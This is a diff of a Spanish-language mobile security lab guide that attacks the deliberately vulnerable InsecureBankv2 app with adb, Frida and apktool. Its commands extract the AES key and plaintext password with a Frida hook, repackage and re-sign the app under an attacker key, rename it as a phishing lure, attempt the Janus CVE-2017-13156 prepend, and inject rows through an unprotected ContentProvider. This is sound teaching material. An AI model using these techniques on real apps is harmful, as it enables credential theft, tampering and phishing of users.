@@ -55,7 +55,7 @@
 
 | Artefacto | Qué es |
 |---|---|
-| `reports/hook-m9-clave.js` | Hook de Frida que imprime la clave AES en memoria |
+| `tools/hook-m9-clave.js` | Hook de Frida que imprime la clave AES en memoria |
 | `reports/InsecureBankv2_mod2_signed.apk` | La app parcheada y firmada por "el atacante" |
 | `reports/attacker.keystore` | El keystore con el que se firmó |
 | `reports/clase3/prepend.py` | Script del intento Janus |
@@ -111,25 +111,70 @@ apksigner verify --print-certs ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk \
 
 ### 0.4 ¿Está la app instalada y con la IP del servidor?
 
+Este bloque es una **comprobación, no una orden**: que `rc=1` en la segunda línea
+es información, no un fallo del guion.
+
 ```bash
 D="-s 172.25.208.100:5555"
 adb $D shell pm list packages | grep insecurebankv2
 adb $D shell "cat /data/data/com.android.insecurebankv2/shared_prefs/com.android.insecurebankv2_preferences.xml" \
-  | grep -E 'serverip|serverport'
+  | grep -E 'serverip|serverport' \
+  || echo "SIN CONFIGURAR: la app caerá en FilePref (sigue el paso de abajo)"
 ```
 
-Si el fichero no existe o no lo puede leer la app, la app arranca en la pantalla
-`FilePref` y no llega al login. **No lo resuelvas empujando el fichero con
-`adb push`**: el fichero queda propiedad de root y la app (que corre como
-`u0_a75`) no puede leerlo, así que volverá a `FilePref` con el valor por defecto
-`10.0.2.2`. Escríbelo a mano en la pantalla:
+✅ **Salida real** con el laboratorio ya configurado:
+
+```
+package:com.android.insecurebankv2
+    <string name="serverport">8888</string>
+    <string name="serverip">172.25.208.104</string>
+```
+
+Si sale el `SIN CONFIGURAR` (o el fichero directamente no existe, que es lo que
+pasa en una instalación recién hecha), la app arranca en la pantalla `FilePref`
+y no llega al login. **No lo resuelvas empujando el fichero con `adb push`**: el
+fichero queda propiedad de root y la app (que corre como `u0_a75`) no puede
+leerlo, así que volverá a `FilePref` con el valor por defecto `10.0.2.2`.
+Escríbelo a mano en la pantalla con este bloque, ya verificado:
 
 ```bash
 adb $D shell am start -n com.android.insecurebankv2/.FilePrefActivity
-# Server IP:   -> 172.25.208.104   (campo en [138,92][632,129])
-# Server Port: -> 8888             (campo en [138,163][632,200])
-# Submit:                           (botón  en [4,252][636,314])
+# espera a que la pantalla este LISTA, no un sleep fijo: si no, el tap cae
+# en el vacio y adb devuelve 0 igualmente (fallo silencioso).
+for i in $(seq 1 20); do
+  adb $D shell uiautomator dump /sdcard/ui.xml >/dev/null 2>&1
+  adb $D shell cat /sdcard/ui.xml | grep -q edittext_serverip && break
+  sleep 1
+done
+# los campos vienen precargados (10.0.2.2 / 8888): hay que BORRAR antes.
+# toca el BORDE DERECHO del campo, para que el cursor caiga al final.
+adb $D shell input tap 625 110
+for i in $(seq 1 25); do adb $D shell input keyevent 67; done   # 67 = DEL
+adb $D shell input text "172.25.208.104"
+adb $D shell input tap 625 181
+for i in $(seq 1 12); do adb $D shell input keyevent 67; done
+adb $D shell input text "8888"
+adb $D shell input keyevent 111
+adb $D shell input tap 320 283; sleep 3
+adb $D shell "cat /data/data/com.android.insecurebankv2/shared_prefs/com.android.insecurebankv2_preferences.xml" \
+  | grep -E 'serverip|serverport'
+# <string name="serverport">8888</string>
+# <string name="serverip">172.25.208.104</string>
 ```
+
+Las coordenadas de los campos, por si las necesitas a mano:
+
+```
+Server IP:   -> 172.25.208.104   (campo en [138,92][632,129])
+Server Port: -> 8888             (campo en [138,163][632,200])
+Submit:                           (botón  en [4,252][636,314])
+```
+
+> 🧠 **`adb shell input` devuelve `0` aunque no haya hecho nada.** Si escribes en
+> la pantalla equivocada, el `rc` sigue siendo `0` y el fallo es invisible: el
+> siguiente paso falla y parece que el problema es suyo. Por eso todos los
+> scripts de esta clase **terminan verificando un fichero de preferencias**, no
+> confiando en el `rc` de los `tap`.
 
 ---
 
@@ -176,7 +221,7 @@ El paso siguiente es querer interceptar el cifrado con Frida, y ahí es fácil
 equivocarse. Los métodos reales son:
 
 ```bash
-grep -oE 'public [a-zA-Z\[\]]+ [a-zA-Z]+\(' \
+grep -oE 'public (static )?[A-Za-z]+(\[\])? [A-Za-z0-9]+\(' \
   sources/com/android/insecurebankv2/CryptoClass.java
 ```
 
@@ -194,6 +239,18 @@ public String aesEncryptedString(
 > **no da ningún error y simplemente nunca se dispara**, que es la forma más
 > engañosa de perder media hora pensando que Frida está roto.
 
+> 🧠 **Por qué esa regex es tan enrevesada** (es el mismo error dos veces):
+> - `aes256encrypt` lleva **dígitos**, así que el nombre del método necesita
+>   `[A-Za-z0-9]+`. Con `[a-zA-Z]+` no aparece: te da dos de los cuatro
+>   métodos y no sabes por qué.
+> - El tipo de retorno es `byte[]`. `[a-zA-Z\[\]]+` **no** funciona: dentro de
+>   un conjunto de corchetes, `\]` no escapa el cierre. Hay que sacar el `[]`
+>   fuera como grupo: `(\[\])?`.
+>
+> Comprueba siempre que tu `grep` devuelve **las cuatro** líneas. Un `grep` que
+> devuelve menos de lo que esperabas no es "pocos resultados": es un filtro
+> roto que todavía no sabes lo que te está ocultando.
+
 ### 1.3 La clave en memoria, con Frida ✅
 
 El análisis estático (M9) te da la clave leyendo. El análisis dinámico te la da
@@ -201,7 +258,7 @@ El análisis estático (M9) te da la clave leyendo. El análisis dinámico te la
 cifra, y eso no lo puede evitar la app.
 
 ```bash
-cp ~/mobile-owasp-lab/reports/hook-m9-clave.js .
+cp ~/mobile-owasp-lab/tools/hook-m9-clave.js .
 frida -U -p $(adb -s 172.25.208.100:5555 shell pidof com.android.insecurebankv2 | tr -d '\r') \
   -l hook-m9-clave.js
 ```
@@ -215,13 +272,50 @@ frida -U -p $(adb -s 172.25.208.100:5555 shell pidof com.android.insecurebankv2 
 Deja el hook esperando y haz un login válido desde la VM:
 
 ```bash
-adb -s 172.25.208.100:5555 shell input tap 320 102   # usuario
-adb -s 172.25.208.100:5555 shell input text "dinesh"
-adb -s 172.25.208.100:5555 shell input tap 320 171   # contraseña
-adb -s 172.25.208.100:5555 shell input text "Dinesh@123\$"
-adb -s 172.25.208.100:5555 shell input keyevent 111  # cerrar teclado
-adb -s 172.25.208.100:5555 shell input tap 320 234   # Login
+D="-s 172.25.208.100:5555"
+# GUARDA: sin IP configurada, la app cae en FilePref y los tap de abajo
+# no hacen nada (y adb devuelve rc=0 igual). No sigas si falla.
+adb $D shell "cat /data/data/com.android.insecurebankv2/shared_prefs/com.android.insecurebankv2_preferences.xml" \
+  | grep -q '172.25.208.104' \
+  || { echo "CONFIGURA LA IP PRIMERO (§0.4)"; exit 1; }
+
+adb $D shell am start -n com.android.insecurebankv2/.LoginActivity
+sleep 3
+adb $D shell input tap 320 102   # usuario
+adb $D shell input text "dinesh"
+adb $D shell input tap 320 171   # contraseña
+adb $D shell input text "Dinesh@123\$"
+adb $D shell input keyevent 111  # cerrar teclado
+adb $D shell input tap 320 234   # Login
+sleep 5
 ```
+
+Y **verifica que el login ha pasado de verdad**, en lugar de fiarte del `rc`:
+
+```bash
+adb $D shell "ls /data/data/com.android.insecurebankv2/shared_prefs/" | grep mySharedPreferences
+# mySharedPreferences.xml
+```
+
+Ese fichero es la prueba de que `saveCreds()` corrió. Si no aparece, el login
+falló; y entonces el §1.4 no tendrá nada que descifrar.
+
+> ⚠️ **`input text` añade, no limpia.** Si la app ya tiene credenciales
+> guardadas, el campo aparece autocompletado (`Autofill Credentials`) y lo que
+> escribas **se suma** al valor que ya estaba. El login sigue pareciendo
+> correcto, pero lo que se guarda es `dineshdinesh` con la contraseña repetida
+> dos veces. Para escribir limpio, borra antes el campo tocando su borde
+> derecho (así el cursor cae al final) y vaciando con `DEL`:
+>
+> ```bash
+> adb $D shell input tap 615 102
+> for i in $(seq 1 30); do adb $D shell input keyevent 67; done   # 67 = DEL
+> adb $D shell input text "dinesh"
+> ```
+>
+> Y comprueba en qué pantalla estás antes de escribir: si la app cayó en
+> `FilePref` (IP/Port) porque se reinstaló y borró las preferencias, tus `tap`
+> se quedan en un formulario vacío y no hay login que hookear.
 
 ✅ **Salida real del hook**:
 
@@ -247,23 +341,53 @@ El mismo hook captura el descifrado. Se dispara desde el receptor de SMS (que se
 explica en la Fase 3), así que adelántate y ejecútalo:
 
 ```bash
-adb -s 172.25.208.100:5555 shell am broadcast \
+D="-s 172.25.208.100:5555"
+adb $D shell am broadcast \
   -n com.android.insecurebankv2/.MyBroadCastReceiver \
   --es phonenumber "+34600000000" --es newpass "PRUEBA-M9"
+sleep 3
 ```
+
+> 🔖 **Prerrequisito, y no es opcional.** El receptor lee el usuario y la
+> contraseña de `mySharedPreferences`, que solo escribe `saveCreds()` **cuando un
+> login ha funcionado**. Si acabas de reinstalar la APK, ese fichero no existe y
+> el receptor peta un `NullPointerException` que **se traga**:
+>
+> ```
+> W System.err: java.lang.NullPointerException: Attempt to invoke virtual method
+>   'byte[] java.lang.String.getBytes()' on a null object reference
+>   at android.util.Base64.decode(Base64.java:118)
+>   at com.android.insecurebankv2.MyBroadCastReceiver.onReceive(MyBroadCastReceiver.java:31)
+> ```
+>
+> Sin ese log, parece que el ataque no funciona. No es eso: es que **nunca hubo
+> contraseña que exfiltrar**. Haz el login del §1.3 antes de esto.
 
 ✅ **Salida real del hook**:
 
 ```
-  [M9] aesDeccryptedString (descifrando)  <-  "DTrW2VXjSoFdg0e61fHxJg=="
+  [M9] aesDeccryptedString (descifrando)  <-  "DTrW2VXjSoFdg0e61fHxJg==
+    "
         clave en memoria : "This is the super secret key 123"
 ```
+
+👀 **Fíjate en el final del Base64: `"…gJg==\n    "`.** Hay un salto de línea y
+cuatro espacios **dentro** de la cadena. No es un fallo del hook: el valor viene
+de `mySharedPreferences.xml`, donde el XML está *indentado* y esas entidades
+(`&#10;`, `&#13;`) forman parte del valor guardado. `Base64.decode` las tolera y
+descifra igual, así que la app funciona.
+
+Parece menor y no lo es: la contraseña cifrada que se almacena no es una cadena
+limpia sino **el XML serializado, con su formato dentro**. Dos consecuencias
+prácticas: (1) si alguien compara el valor guardado con el que espera, no
+coincide aunque la app funcione; (2) cualquier validación que compare cadenas
+cifradas byte a byte fallará por el espacio en blanco.
 
 Lo que entra es el Base64 guardado en las preferencias; lo que sale, y lo que el
 sistema registra, es la contraseña real:
 
 ```bash
-adb -s 172.25.208.100:5555 logcat -d | grep 'For the changepassword'
+adb $D logcat -d | grep 'For the changepassword'
 ```
 
 ✅ **Salida real**:
@@ -521,6 +645,43 @@ adb $D install InsecureBankv2_mod2_signed.apk
 
 ✅ **Salida real**: `Success`
 
+> 🔖 **`uninstall` se lleva las preferencias por delante.** La app arranca en
+> `FilePref` pidiendo IP y puerto, con el default `10.0.2.2` (el loopback del
+> emulador), que **no** es esta VM. Si te saltas el paso siguiente, todos los
+> `input tap` siguientes se quedan escribiendo en un formulario vacío, el login
+> no ocurre y los `grep` de `Successful Login` no encuentran nada — con el guion
+> perfectamente correcto.
+>
+> Vuelve a apuntar la app al host antes de demostrar nada:
+>
+> ```bash
+> adb $D shell am start -n com.android.insecurebankv2/.FilePrefActivity
+> for i in $(seq 1 20); do
+>   adb $D shell uiautomator dump /sdcard/ui.xml >/dev/null 2>&1
+>   adb $D shell cat /sdcard/ui.xml | grep -q edittext_serverip && break
+>   sleep 1
+> done
+> # los campos vienen precargados (10.0.2.2 / 8888): hay que BORRAR antes.
+> # toca el BORDE DERECHO del campo, para que el cursor caiga al final.
+> adb $D shell input tap 625 110
+> for i in $(seq 1 25); do adb $D shell input keyevent 67; done   # 67 = DEL
+> adb $D shell input text "172.25.208.104"
+> adb $D shell input tap 625 181
+> for i in $(seq 1 12); do adb $D shell input keyevent 67; done
+> adb $D shell input text "8888"
+> adb $D shell input keyevent 111
+> adb $D shell input tap 320 283; sleep 3
+> adb $D shell "cat /data/data/com.android.insecurebankv2/shared_prefs/com.android.insecurebankv2_preferences.xml" \
+>   | grep -E 'serverip|serverport'
+> # <string name="serverport">8888</string>
+> # <string name="serverip">172.25.208.104</string>
+> ```
+>
+> Sin el borrado previo te queda `10.0.2.2172.25.208.104` y el login no entra.
+> `KEYCODE_MOVE_END` **no** sirve aquí: en Android 8.1 no lleva el cursor al
+> final en este campo, y los `DEL` se comen lo que tienen a la izquierda.
+> Si esas dos líneas no aparecen, **no sigas**: todo lo demás va a fallar.
+
 Ahora el control, que es lo que da valor a la demostración. **Qué responde
 realmente el servidor** a un usuario que no existe:
 
@@ -538,11 +699,14 @@ curl -s -X POST -d 'username=usuario-inexistente&password=basura' \
 El servidor dice que no. Ahora mete esas mismas credenciales en la app parcheada:
 
 ```bash
+adb $D logcat -c                     # limpia, para que el grep no sea ambiguo
 adb $D shell am start -n com.android.insecurebankv2/.LoginActivity
+sleep 3
 adb $D shell input tap 320 102; adb $D shell input text "usuario-inexistente"
 adb $D shell input tap 320 171; adb $D shell input text "basura"
 adb $D shell input keyevent 111
 adb $D shell input tap 320 234
+sleep 5
 ```
 
 ✅ **Salida real**: estás en `PostLogin`, con `Transfer`, `View Statement` y
@@ -594,34 +758,90 @@ parche parcial da una falsa sensación de éxito. Un atacante de verdad sustituy
 el cuerpo del método entero, o engancha el resultado con Frida — que es
 exactamente lo que se hizo en la Clase 2.
 
-> Vuelve a levantar el servidor antes de continuar:
-> `sudo systemctl start insecurebankv2-server`
+**Y ahora hay que levantar el servidor otra vez.** No es opcional: lo que sigue
+en la Fase 3 (el `/devlogin`, el login del Anexo A) habla con `127.0.0.1:8888`,
+y con el servicio parado `curl` sale con `rc=7` y `Connection refused`.
+
+```bash
+sudo systemctl start insecurebankv2-server
+systemctl is-active insecurebankv2-server
+# active
+```
+
+Comprobarlo aquí, en el sitio, evita un despiste que se manifiesta tres secciones
+más adelante como un fallo que parece de otra cosa.
 
 ### 2.7 M8 de identidad: renombrar la app
 
 El ataque más visible de todos, y el que más pasa en la vida real — phishing
-con distributing una app falsa:
+colando una app falsa:
 
 ```bash
 sed -i 's|<string name="app_name">InsecureBankv2</string>|<string name="app_name">BancoSeguro OFICIAL</string>|' \
   InsecureBankv2_mod/res/values/strings.xml
 ```
 
-✅ **Salida real**, con la app instalada, en la barra de título y en el login:
+Con el `sed` solo no se ve nada en el móvil: has cambiado un fichero fuente,
+no la APK. Hay que **volver a construir, volver a firmar y volver a instalar**,
+en ese orden, y volver a desinstalar antes porque la firma es la de `Attacker`:
+
+```bash
+export PATH="$PATH:/opt/android-sdk/build-tools/33.0.2"
+cd ~/mobile-owasp-lab/reports
+apktool b InsecureBankv2_mod -o InsecureBankv2_mod3.apk
+apksigner sign --ks attacker.keystore --ks-key-alias attacker \
+  --ks-pass pass:attacker123 --key-pass pass:attacker123 \
+  --out InsecureBankv2_mod3_signed.apk InsecureBankv2_mod3.apk
+
+D="-s 172.25.208.100:5555"
+adb $D uninstall com.android.insecurebankv2
+adb $D install InsecureBankv2_mod3_signed.apk
+adb $D shell am start -n com.android.insecurebankv2/.LoginActivity
+sleep 3
+adb $D shell uiautomator dump /sdcard/ui.xml >/dev/null
+adb $D shell cat /sdcard/ui.xml | grep -o 'text="[^"]*"' | head -5
+```
+
+> ⚠️ **`sed` no recompila.** Si te saltas el `apktool b` + `apksigner sign`,
+> el `grep` del siguiente bloque no encuentra nada y parece que el ataque de
+> renombrado no funciona. Lo que pasa es que estás mirando el `resources.arsc`
+> de una APK que construiste **antes** del `sed`. Comprueba siempre en qué APK
+> estás mirando, no solo que el fichero fuente cambió.
+
+✅ **Salida real**, con la app recién instalada, en la pantalla de login:
 
 ```
 text="BancoSeguro OFICIAL"
-text="dinesh"
-text="••••••••"
+text="Autofill Credentials"
 text="Login"
+text="Username"
+text="Password"
 ```
+
+Los valores guardados (`text="dinesh"` y los `••••`) solo aparecen tras un login
+correcto y el botón `Autofill Credentials`, porque `saveCreds()` es lo que
+rellena esas preferencias. La prueba de que el renombrado es real no depende de
+ellos:
 
 Y el nombre va **dentro** de la APK, no es una etiqueta del launcher:
 
 ```bash
-unzip -p InsecureBankv2_mod2_signed.apk resources.arsc | strings | grep BancoSeguro
+unzip -p InsecureBankv2_mod3_signed.apk resources.arsc | strings | grep BancoSeguro
 # BancoSeguro OFICIAL
 ```
+
+Comprobación de control, que es la que demuestra que el renombrado es real y no
+un efecto del launcher: la APK **original** sigue diciendo su propio nombre.
+
+```bash
+unzip -p ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk resources.arsc \
+  | strings | grep -c 'BancoSeguro' || echo "0 (original: sin renombrar)"
+# 0 (original: sin renombrar)
+```
+
+> `grep -c` devuelve `rc=1` cuando cuenta cero, aunque el `0` que imprime sea la
+> respuesta correcta. Un `rc` no cero aquí no es un fallo: es exactamente lo que
+> querías demostrar. Por eso el `|| echo` deja el mensaje y el `rc` en 0.
 
 > El nombre no es lo que el usuario ve. Lo que el usuario ve es lo que el
 > atacante escribió dentro del binario que tú firmaste... o él firmó.
@@ -656,37 +876,92 @@ public class CryptoClass {
 
 ```bash
 cd ~/mobile-owasp-lab/reports/clase3
-javac -d classes janus-src/com/android/insecurebankv2/CryptoClass.java
+rm -rf classes classes.dex          # importante: si no, reutilizas el dex viejo
+javac -d classes janus-src/CryptoClass.java
 d8 --min-api 15 --output . classes/com/android/insecurebankv2/CryptoClass.class
 ls -l classes.dex
 ```
 
-✅ **Salida real**: `-rw-rw-r-- 1 cwl cwl 856 Oct  4 03:48 classes.dex`
+> ⚠️ **La ruta es `janus-src/CryptoClass.java`, no
+> `janus-src/com/android/insecurebankv2/CryptoClass.java`.** El paquete lo
+> declara el propio fichero, no el directorio donde vive. Con la ruta "lógica",
+> `javac` responde `error: file not found`, `d8` se queja de que no encuentra
+> `classes/com/…/CryptoClass.class`… y `ls -l classes.dex` **aun así muestra un
+> `classes.dex`**: el de la ejecución anterior. Verificarías la firma de un
+> fichero viejo creyendo que acabas de construirlo. Por eso el `rm` va primero.
 
-**Paso 2: prependerlo y arreglar el directorio central** (`prepend.py`, ya en
-`reports/clase3/`). Al desplazar todo N bytes, las direcciones de las cabeceras
-locales que declara el directorio central quedan desfasadas:
+✅ **Salida real**: `-rw-rw-r-- 1 cwl cwl 844 Oct  4 16:46 classes.dex`
+
+**Paso 2: prependerlo y arreglar el directorio central.** Al desplazar todo
+N bytes, las direcciones de las cabeceras locales que declara el directorio
+central quedan desfasadas:
+
+```bash
+cd ~/mobile-owasp-lab/reports/clase3
+rm -f InsecureBankv2_janus.apk
+python3 prepend.py \
+  ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk \
+  InsecureBankv2_janus.apk
+```
+
+Los dos argumentos son **obligatorios**: el primero es la APK original, el
+segundo la de salida. Con uno solo el script aborta con su mensaje de uso y
+deja en disco la APK de una ejecución anterior.
+
+✅ **Salida real**:
 
 ```
-DEX prependido: 856 bytes; dir. central en 3408268 -> 3409124
+DEX prependido: 844 bytes; dir. central en 3408268 -> 3409112
 entradas del dir. central reubicadas: 555
-escrito InsecureBankv2_janus.apk: 3463285 bytes
+escrito InsecureBankv2_janus.apk: 3463273 bytes
+entrada a entrada identicas: OK (555 entradas)
 ```
+
+La última línea merece párrafo propio. El script comprueba que las 555 entradas
+del ZIP se extraen **byte a byte iguales** a las del original. Lo que sí cambia
+es la *metadata*: los offsets del directorio central, que tienen que moverse
++844 para que un lector ZIP encuentre las entradas en su nueva posición. Por eso
+comparar el fichero entero con `cmp` **no** es la prueba — tiene que diferir. Y
+por eso la firma sigue valiendo.
 
 **Paso 3: ¿sigue siendo válida la firma original?** ✅
 
+```bash
+cd ~/mobile-owasp-lab/reports/clase3
+apksigner verify --verbose --print-certs InsecureBankv2_janus.apk \
+  | grep -E 'Verified using v1|DN:'
+```
+
+✅ **Salida real**:
+
 ```
 Verified using v1 scheme (JAR signing): true
+Signer #1 certificate DN: CN=Dinesh Shetty, OU=Services, O=SI, L=Boston, ST=MA
 ```
 
-**Y el contenido es byte a byte el mismo** ✅:
+El firmante sigue siendo el desarrollador original, y el verificador da el visto
+bueno, sobre un fichero al que le hemos metido 844 bytes por delante.
+
+**Y las entradas se extraen byte a byte iguales** ✅ — esto ya lo verificó
+`prepend.py`, pero puedes comprobarlo a mano extrayendo las dos:
+
+```bash
+mkdir -p /tmp/cmp/{orig,janus}
+cd /tmp/cmp/orig  && unzip -oq ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk \
+  AndroidManifest.xml classes.dex
+cd /tmp/cmp/janus && unzip -oq \
+  ~/mobile-owasp-lab/reports/clase3/InsecureBankv2_janus.apk \
+  AndroidManifest.xml classes.dex
+cd /tmp/cmp && sha256sum orig/* janus/*
+```
+
+✅ **Salida real** (cada hash aparece dos veces, y coincide):
 
 ```
-AndroidManifest.xml: IDÉNTICO
-  sha256 1c837665af41be7d51cfa8475106e69f14aee6342f4df81f39273b8ae64fcaf9
-  sha256 1c837665af41be7d51cfa8475106e69f14aee6342f4df81f39273b8ae64fcaf9
-0eb27df9847d5709df0cd2677baaf66ee3226e45b132149dc3039456dde79533  classes.dex
-0eb27df9847d5709df0cd2677baaf66ee3226e45b132149dc3039456dde79533  classes.dex
+1c837665af41be7d51cfa8475106e69f14aee6342f4df81f39273b8ae64fcaf9  orig/AndroidManifest.xml
+0eb27df9847d5709df0cd2677baaf66ee3226e45b132149dc3039456dde79533  orig/classes.dex
+1c837665af41be7d51cfa8475106e69f14aee6342f4df81f39273b8ae64fcaf9  janus/AndroidManifest.xml
+0eb27df9847d5709df0cd2677baaf66ee3226e45b132149dc3039456dde79533  janus/classes.dex
 ```
 
 Esto es **Janus funcionando a medias**, y hay que decirlo así: el esquema de
@@ -694,24 +969,37 @@ firma v1 de verdad no protege de bytes prependidos, y `apksigner` lo confirma.
 
 **Paso 4: ¿instala Android el resultado?** ❌ **No.**
 
+```bash
+# ruta absoluta a propósito: el paso anterior te ha dejado en /tmp/cmp
+adb -s 172.25.208.100:5555 install \
+  ~/mobile-owasp-lab/reports/clase3/InsecureBankv2_janus.apk \
+  || echo "RECHAZADA — este es el resultado esperado, no un fallo del guion"
 ```
-adb install InsecureBankv2_janus.apk
-# Failure [INSTALL_PARSE_FAILED_UNEXPECTED_EXCEPTION: Failed to parse
-#  /data/app/vmdl41843812.tmp/base.apk: AndroidManifest.xml]
+
+✅ **Salida real**:
+
+```
+adb: failed to install /home/cwl/mobile-owasp-lab/reports/clase3/InsecureBankv2_janus.apk:
+  Failure [INSTALL_PARSE_FAILED_UNEXPECTED_EXCEPTION: Failed to parse
+  /data/app/vmdl1990673405.tmp/base.apk: AndroidManifest.xml]
+Performing Streamed Install
+RECHAZADA — este es el resultado esperado, no un fallo del guion
 ```
 
 Y el motivo concreto:
 
 ```
-W PackageParser: Failed to parse /data/app/vmdl41843812.tmp/base.apk
+W PackageParser: Failed to parse /data/app/vmdl2122369588.tmp/base.apk
 W PackageParser: java.io.FileNotFoundException: AndroidManifest.xml
 W PackageParser:  at android.content.res.AssetManager.openXmlAssetNative(Native Method)
+W PackageParser:  at android.content.res.AssetManager.openXmlBlockAsset(AssetManager.java:546)
+W PackageParser:  at android.content.res.AssetManager.openXmlResourceParser(AssetManager.java:514)
 ```
 
 El parser de paquetes de Android 8.1 busca el manifiesto como un *asset* del
-ZIP y no lo encuentra en un fichero con bytes prependidos. Ni siquiera tried la
-variante sin corregir el directorio central: mismo `FileNotFoundException`. Y la
-APK original, como control, instala bien.
+ZIP y no lo encuentra en un fichero con bytes prependidos. Ni siquiera probando
+la variante sin corregir el directorio central sale lo mismo:
+`FileNotFoundException`. Y la APK original, como control, instala bien.
 
 **Y aquí viene lo bonito: el límite de versiones encaja exactamente.** NVD
 documenta CVE-2017-13156 como afecta a Android **5.1.1 a 8.0**. Nuestra VM es
@@ -734,10 +1022,44 @@ rango documentado, comprobado de forma independiente.
 La clase 3 deja la APK troyanizada instalada. Antes de cerrar:
 
 ```bash
-adb -s 172.25.208.100:5555 uninstall com.android.insecurebankv2
-adb -s 172.25.208.100:5555 install ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk
+D="-s 172.25.208.100:5555"
+adb $D uninstall com.android.insecurebankv2
+adb $D install ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk
 apksigner verify --print-certs ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk | grep 'DN:'
 # Signer #1 certificate DN: CN=Dinesh Shetty, OU=Services, O=SI, L=Boston, ST=MA
+```
+
+Y reapunta la app al host, porque el `uninstall` anterior se ha llevado las
+preferencias y la siguiente Fase 3 necesita que el login funcione:
+
+```bash
+adb $D shell am start -n com.android.insecurebankv2/.FilePrefActivity
+for i in $(seq 1 20); do
+  adb $D shell uiautomator dump /sdcard/ui.xml >/dev/null 2>&1
+  adb $D shell cat /sdcard/ui.xml | grep -q edittext_serverip && break
+  sleep 1
+done
+# toca el BORDE DERECHO del campo: así el cursor cae al final
+adb $D shell input tap 625 110
+for i in $(seq 1 25); do adb $D shell input keyevent 67; done   # 67 = DEL
+adb $D shell input text "172.25.208.104"
+adb $D shell input tap 625 181
+for i in $(seq 1 12); do adb $D shell input keyevent 67; done
+adb $D shell input text "8888"
+adb $D shell input keyevent 111
+adb $D shell input tap 320 283; sleep 3
+adb $D shell "cat /data/data/com.android.insecurebankv2/shared_prefs/com.android.insecurebankv2_preferences.xml" \
+  | grep -E 'serverip|serverport'
+```
+
+> Los campos de `FilePref` salen **precargados** con `10.0.2.2` y `8888`. Si
+> escribes encima sin borrar, te queda `10.0.2.2172.25.208.104`, el servidor no
+> responde, y el síntoma —login que no entra— no señala la causa.
+
+Comprueba también que el backend quedó arriba, que §2.6 lo apagó:
+
+```bash
+systemctl is-active insecurebankv2-server   # active
 ```
 
 ---
@@ -860,10 +1182,18 @@ Encadena cuatro riesgos del OWASP Mobile Top 10 en un solo componente:
 
 ### 3.4 El ContentProvider sin ningún permiso ✅
 
+> 🔖 **Fíjate en el `cd` de este bloque.** En el paso 2.1 te moviste a
+> `~/mobile-owasp-lab/reports`, así que la ruta relativa `resources/…` ya no
+> apunta al manifiesto y `grep` responde `No such file or directory`. Si has
+> seguido la clase en **una sola terminal** (que es lo natural), estos dos
+> comandos necesitan volver al árbol de JADX por su cuenta. Ejecuta los bloques
+> del guion tal cual, en su propio `cd`, y no te saltará nada.
+
 El provider de tracking de usuarios también es `exported="true"`, y esta es la
 lista de sus permisos:
 
 ```bash
+cd ~/mobile-owasp-lab/reports/jadx/InsecureBankv2
 python3 - <<'PY'
 import xml.etree.ElementTree as ET
 ns='{http://schemas.android.com/apk/res/android}'
@@ -880,30 +1210,40 @@ PY
   exported: true | permisos exigidos: NINGUNO
 ```
 
-Y se puede **leer y escribir** desde fuera:
+Y se puede **leer y escribir** desde fuera. La app va insertando una fila por
+cada login, así que la tabla ya tiene contenido **si has hecho algún login**:
 
 ```bash
 U=content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
 adb $D shell content query --uri "$U"
 ```
 
-✅ **Salida real**:
+✅ **Salida real** con un login hecho (en una instalación recién hecha):
 
 ```
-Row: 0 id=11, name=devadmin
-Row: 1 id=15, name=devadmin
-Row: 2 id=12, name=dinesh
+Row: 0 id=3, name=dinesh
 ```
+
+Si no has hecho login todavía, la tabla está vacía y `adb` responde
+`No result found.` — **eso no es que el provider esté protegido**: es que nadie
+ha escrito nada. Haz un login y vuelve a preguntar.
+
+> 🔖 **El `id` es un autoincremento y cambia.** Con tres logins previos verás
+> `id=11`, `id=15`, `id=12`… lo que importa es la **forma**: una fila por
+> login, con el **nombre de usuario en claro** dentro de la base de datos de una
+> app bancaria. Fíjate en que `name` va en texto plano: el usuario se almacena
+> sin cifrar mientras la contraseña sí lo estaba. La protección es desigual.
 
 ```bash
 adb $D shell content insert --uri "$U" --bind name:s:injectado
 adb $D shell content query --uri "$U" | tail -1
 ```
 
-✅ **Salida real**:
+✅ **Salida real** (con un login previo; si la tabla estaba vacía, sale
+`Row: 0 id=1, name=injectado`):
 
 ```
-Row: 11 id=22, name=injectado
+Row: 1 id=4, name=injectado
 ```
 
 Cualquier app puede **inyectar** filas en la base de datos de la app bancaria.
@@ -914,12 +1254,16 @@ Cualquier app puede **inyectar** filas en la base de datos de la app bancaria.
 > adb $D shell "content delete --uri \"$U\" --where \"name='injectado'\""
 > ```
 > Sin las comillas: `SQLiteException: no such column: injectado (code 1)`.
+>
+> Y borra la fila al terminar: si no, el siguiente alumno que mire la tabla
+> se encuentra `injectado` y lo toma por parte de la app.
 
 ### 3.5 SDKs de terceros que nadie pidió ✅
 
 En una app de banca hay publicidad y billetera:
 
 ```bash
+cd ~/mobile-owasp-lab/reports/jadx/InsecureBankv2
 grep -oE 'android:name="com\.google\.android\.gms\.[^"]*"' \
   resources/AndroidManifest.xml | sort -u
 ```
@@ -929,6 +1273,7 @@ grep -oE 'android:name="com\.google\.android\.gms\.[^"]*"' \
 ```
 com.google.android.gms.ads.AdActivity
 com.google.android.gms.ads.purchase.InAppPurchaseActivity
+com.google.android.gms.version
 com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION
 com.google.android.gms.wallet.EnableWalletOptimizationReceiver
 com.google.android.gms.wallet.api.enabled
@@ -956,7 +1301,7 @@ root decorativa: cumple para la captura de pantalla y no para la seguridad.
 
 > - **M9 (Reverse Engineering):** en cinco minutos JADX devolvió la clave AES, el
 >   IV y el modo. Frida devolvió la contraseña en claro en memoria. No hubo ni un
->   solo control que lo impidiera; `debuggable="true"` incluso loudo facilita.
+>   solo control que lo impidiera; `debuggable="true"` incluso lo facilita.
 > - **M8 (Code Tampering):** desensamblar, cambiar un `if` por un `nop`,
 >   reconstruir y firmar es un minuto. La app resultante va firmada por
 >   `CN=Attacker` y el usuario no tiene forma de notarlo.
@@ -982,6 +1327,21 @@ Si tienes 10 minutos y quieres el efecto completo, este es el orden. Todo está
 verificado por separado, así que funciona:
 
 ```bash
